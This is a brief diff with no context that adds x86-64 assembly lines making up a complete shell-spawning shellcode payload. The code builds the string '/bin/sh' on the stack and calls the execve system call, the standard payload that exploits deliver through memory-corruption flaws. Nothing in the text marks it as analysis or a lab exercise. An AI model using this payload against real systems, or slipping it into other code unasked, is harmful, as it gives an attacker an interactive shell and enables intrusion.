@@ -1,0 +1,10 @@
+mov rax, 0x0068732f6e696200
+mov al, 0x2f
+push rax
+push rsp
+pop rdi
+push 0x3b
+pop rax
+xor esi, esi
+xor edx, edx
+syscall
